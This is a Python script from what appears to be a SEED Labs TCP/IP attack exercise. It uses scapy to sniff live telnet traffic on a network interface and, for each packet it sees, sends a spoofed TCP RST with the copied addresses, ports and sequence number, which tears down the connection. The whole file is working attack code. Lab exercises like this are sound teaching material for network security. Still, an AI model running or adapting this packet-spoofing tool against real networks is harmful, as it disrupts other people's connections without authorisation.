#!/usr/bin/env python3
"""
Task 2: TCP RST Attack on telnet Connections (Automatic)
SEED Labs - TCP/IP Attack Lab

This script automatically sniffs live telnet traffic and sends a spoofed
TCP RST packet to break the connection as soon as a packet is observed.

Usage:
    python3 rst_attack_auto.py
"""

from scapy.all import *

IFACE    = "br-<network_id>"  # replace with the actual bridge interface name
FILTER   = "tcp and port 23"  # capture only telnet traffic


def send_rst(pkt):
    """Send a spoofed RST packet in response to a sniffed telnet packet."""
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return

    ip_layer  = pkt[IP]
    tcp_layer = pkt[TCP]

    # Build spoofed RST from the client side toward the server
    ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
    tcp = TCP(
        sport=tcp_layer.sport,
        dport=tcp_layer.dport,
        flags="R",
        seq=tcp_layer.seq,
    )
    rst_pkt = ip / tcp
    send(rst_pkt, verbose=0)
    print(f"RST sent: {ip_layer.src}:{tcp_layer.sport} -> "
          f"{ip_layer.dst}:{tcp_layer.dport}  seq={tcp_layer.seq}")


print(f"[*] Sniffing for telnet traffic on {IFACE} ...")
sniff(iface=IFACE, filter=FILTER, prn=send_rst)
